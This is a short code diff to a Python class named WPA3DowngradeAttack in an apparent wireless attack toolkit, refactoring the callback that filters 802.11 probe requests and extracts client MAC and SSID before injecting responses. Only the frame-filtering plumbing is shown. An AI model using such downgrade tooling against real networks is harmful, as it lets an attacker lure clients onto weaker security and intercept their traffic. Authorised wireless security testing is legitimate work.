@@ -25,6 +25,7 @@ from typing import Callable, Optional
 
 from wifit3.models import AccessPoint
 from wifit3.dot11.probe import probe_resp
+from wifit3.dot11.packet import ProbeReqPacket
 
 from .campaign import Campaign
 
@@ -119,24 +120,22 @@ class WPA3DowngradeAttack(Campaign):
 
     # -- Hot path: RX filter + async dispatch --------------------------------
 
-    def _rx_cb(self, frame_bytes: bytes, rssi: int, ts: float) -> None:
+    def _rx_cb(self, pkt) -> None:
         """Sync, runs on asyncio loop. Keep this fast — minimal work, defer
         injection to an asyncio task."""
         if self.stopped or not self._active:   # request_stop() gates us before teardown unregisters
             return
-        # Need at least MAC header (24B) + SSID IE tag+len (2B) + 2B for one rate IE start.
-        if len(frame_bytes) < 28:
+        if not isinstance(pkt, ProbeReqPacket):
             return
-        # FC byte0: type=Mgmt(00), subtype=ProbeReq(0100) → 0x40. Mask out version.
-        if (frame_bytes[0] & 0xFC) != 0x40:
-            return
-        client_mac = frame_bytes[10:16]
-        # Tag 0 (SSID IE) MUST be first in a probe request per 802.11.
-        if frame_bytes[24] != 0x00:
+        # Wildcard vs directed needs the raw SSID-IE length (the parser maps an empty
+        # SSID to "<hidden>"), so read the tag off the bytes here.
+        frame_bytes = pkt.raw
+        if len(frame_bytes) < 28 or frame_bytes[24] != 0x00:
             return
         ssid_len = frame_bytes[25]
         if 26 + ssid_len > len(frame_bytes):
             return
+        client_mac = frame_bytes[10:16]
 
         is_wildcard = ssid_len == 0
         is_directed_for_us = (
